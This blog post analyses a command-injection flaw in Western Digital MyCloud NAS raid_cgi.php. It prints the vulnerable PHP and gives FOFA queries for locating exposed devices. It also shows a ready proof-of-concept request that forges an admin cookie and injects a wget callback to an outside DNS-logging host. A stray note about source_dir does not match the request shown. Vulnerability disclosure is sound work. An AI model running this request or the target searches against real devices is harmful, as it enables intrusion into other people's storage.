---
title: "西部数码 NAS raid_cgi.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-raid_cgi-rce.html
asset_dir: assets/西部数码-nas-raid_cgi.php-命令执行漏洞
---

# 西部数码 NAS raid\_cgi.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/12 13:08
- 561浏览
- [0评论](#comment)
- 19分钟阅读

深入探索

SQL注入防护

恶意软件分析工具

安全认证考试

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS raid\_cgi.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `raid_cgi.php` 其业务实现逻辑如下

```
<?php
//session_start();
//$r = new stdClass();
//$r->success = false;
//
//include ("../lib/login_checker.php");
//
///* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
//if (login_check() != 1)
//{
//  echo json_encode($r);
//  exit;
//}

$action = $_POST['cmd'];
if ($action == "") $action = $_GET['cmd'];

$r = new stdClass();
switch ($action)
{
    case "cgi_Run_Smart_Test":
    {
       $run_cmd = $_POST['run_cmd'];
       system("smart_test -X > /dev/null");

       $run_cmd .= " > /dev/null &";
       system($run_cmd);
       sleep(3);

       $r->run_cmd = $run_cmd;
       $r->ret = $ret;
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "cgi_Get_SysInfo":
    {
       $_TMP_SYSINFO_XML = "/var/www/xml/_tmp_sysinfo.xml";
       system("xmldbc  -p /disks $_TMP_SYSINFO_XML -S /var/run/xmldb_sock_sysinfo");
       echo file_get_contents($_TMP_SYSINFO_XML);
       @unlink($_TMP_SYSINFO_XML);
    }
       break;
}
?>
```

深入探索

Web安全课程

代码安全审计

编码转换工具

当**cmd=cgi\_Run\_Smart\_Test**时，`$run_cmd` 是直接拼接进**system**进行执行，期间对参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞扫描服务

# 漏洞复现

> 需要注意source\_dir应为数组形式，否则foreach循环判断会出错

```
POST /web/storage/raid_cgi.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

cmd=cgi_Run_Smart_Test&run_cmd=$(wget raid.cgi.dnslog.pt)
```

[![西部数码 NAS raid_cgi.php 命令执行漏洞](images/img-001-fa6d0b2033c0.webp)](https://image.mrxn.net/5ac08412a35944de866915b0139bc40a.webp)

成功在DNSLOG平台收到DNS和HTTP请求

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
